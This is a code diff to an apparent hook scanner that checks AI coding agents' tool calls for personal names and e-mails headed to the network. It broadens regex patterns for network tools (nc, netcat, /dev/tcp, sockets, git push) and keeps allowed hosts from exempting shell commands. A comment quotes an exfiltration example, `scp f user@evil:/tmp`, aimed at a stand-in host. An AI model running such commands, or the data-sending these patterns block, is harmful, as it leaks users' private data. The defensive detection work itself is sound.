@@ -24,7 +24,10 @@ _SEP = re.compile(r"[\s._+\-]+")
 NETWORK = re.compile(
     r"\b(?:curl|wget|http|https|httpie|xh|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|ftp|lftp|"
     r"invoke-webrequest|invoke-restmethod|iwr|irm|start-bitstransfer|"
-    r"requests\.|urllib|httpx|aiohttp|fetch\(|axios|got\(|websocket|smtplib|sendmail|mail\s|gh\s+api)", re.IGNORECASE)
+    r"requests\.|urllib|httpx|aiohttp|fetch\(|axios|got\(|websocket|smtplib|sendmail|mail\s|gh\s+api|"
+    r"\bimport\s+socket\b|\bfrom\s+socket\s+import\b|\bsocket\.(?:socket|create_connection)\b|"
+    r"\bcreate_connection\s*\(|"
+    r"\bgit(?:\.exe)?\b[^|;&\n]*?\s(?:push|pull|fetch|clone|ls-remote|remote\s+(?:add|set-url)|submodule|archive\s+--remote|send-email|request-pull)\b|\b(?:git|ssh|svn)://|http\.client|ftplib|telnetlib|/dev/(?:tcp|udp)/)", re.IGNORECASE)
 
 
 # Code that sends requests (for files the agent writes). Narrower than NETWORK: a note with a URL is not code.
@@ -35,8 +38,8 @@ NETWORK_CODE = re.compile(
 
 
 _CHAIN = re.compile(r"&&|\|\||;|\n")
-_LOCAL_ONLY = re.compile(r"\s*(?:git\s+(?:config|commit|tag|log|show|status|add|init)\b|cd\s|export\s+GIT_|"
-                         r"(?:echo|printf)\b[^|]*>>?\s*\S+\s*$)")  # `echo X > file` is a local write
+# (`echo X > f && python send.py` reads f at run time, so a write next to a network command is kept)
+_LOCAL_ONLY = re.compile(r"\s*(?:git\s+(?:config|commit|tag|log|show|status|add|init)\b|cd\s|export\s+GIT_)")
 _EXT = r"\.(?:py|js|mjs|cjs|ts|sh|bash|ps1|rb|pl|php)"
 _SCRIPT = re.compile(r'"([^"]+' + _EXT + r')"|\'([^\']+' + _EXT + r')\'|([^\s"\';|&]+' + _EXT + r')(?=[\s"\';|&]|$)')
 _CD = re.compile(r'\bcd\s+(?:"([^"]+)"|([^\s;&|]+))')
@@ -237,6 +240,11 @@ def strings_of(obj) -> list[str]:
 _NON_HTTP = re.compile(r"\b(?:scp|sftp|ssh|rsync|nc|ncat|socat|telnet|ftp|sendmail)\b|\S@[\w.-]+:")
 
 
+# allow_hosts does not apply to shell commands: a shell line can name an allowed host and send elsewhere in too many
+# ways (pipes, substitutions, git ssh "host:path", gh --hostname); found one by one in the release review, 2026-10-30
+SHELL_TOOLS = ("Bash", "PowerShell", "exec_command", "shell")
+
+
 def host_allowed(text: str, allow_hosts: list[str]) -> bool:
     if _NON_HTTP.search(text):
         return False  # `scp f user@evil:/tmp # https://github.com`: the real target is not the URL
@@ -263,6 +271,25 @@ def _runs_network_script(command: str, cwd: str | None) -> bool:
     return False
 
 
+def safe_ignore(ident: Identity) -> list[str]:
+    """`ignore` entries that are used. `ignore` only hides name matches (e-mails are always checked on the uncut
+    call), and only a literal token: an entry with whitespace or `%`, one that is a piece of a protected form
+    ("kowalski", "Jan-Kowalski"), or one that hides the name only in an encoded form (base64, URL encoding) is
+    dropped. A token that spells the name out ("blogJanKowalskiSite") is kept."""
+    needles = ident.needles()
+    forms = [sq for _, _, sq in needles if sq]
+    keep = []
+    for x in ident.ignore:
+        x = str(x)
+        sx = squash(x)
+        if not sx or "%" in x or any(c.isspace() for c in x.strip()) or any(sx in f for f in forms):
+            continue
+        if _hits(x, needles) and not any(f in sx for f in forms):
+            continue  # it matches only after decoding
+        keep.append(x)
+    return keep
+
+
 def scan_tool_call(tool_name: str, tool_input, ident: Identity, strict: bool = False,
                    cwd: str | None = None) -> list[Finding]:
     """Findings for one PreToolUse event (Claude Code and Codex send the same tool_name / tool_input shape)."""
@@ -286,15 +313,19 @@ def scan_tool_call(tool_name: str, tool_input, ident: Identity, strict: bool = F
         code = joined + "\n" + _file_text(tool_input)
         if not NETWORK_CODE.search(code):
             return []
-    if ident.allow_hosts and host_allowed(joined, ident.allow_hosts):
+    if ident.allow_hosts and host_allowed(joined, ident.allow_hosts) and \
+            tool_name not in SHELL_TOOLS:
         return []
-    if ident.ignore:
-        cut = re.compile("|".join(re.escape(x) for x in ident.ignore if x), re.IGNORECASE)
-        texts = [cut.sub(" ", t) for t in texts]
     needles = ident.needles()
+    ignore = safe_ignore(ident)
+    cut = re.compile("|".join(re.escape(x) for x in ignore), re.IGNORECASE) if ignore else None
     out, seen = [], set()
     for t in texts:
-        for f in _hits(t, needles):
+        found = _hits(t, needles)
+        if cut:  # e-mails from the whole call, names from the call with the ignored tokens cut out
+            found = [f for f in found if f.kind.startswith("email")] + \
+                    [f for f in _hits(cut.sub(" ", t), needles) if not f.kind.startswith("email")]
+        for f in found:
             if (f.kind, f.needle) not in seen:
                 seen.add((f.kind, f.needle))
                 out.append(f)
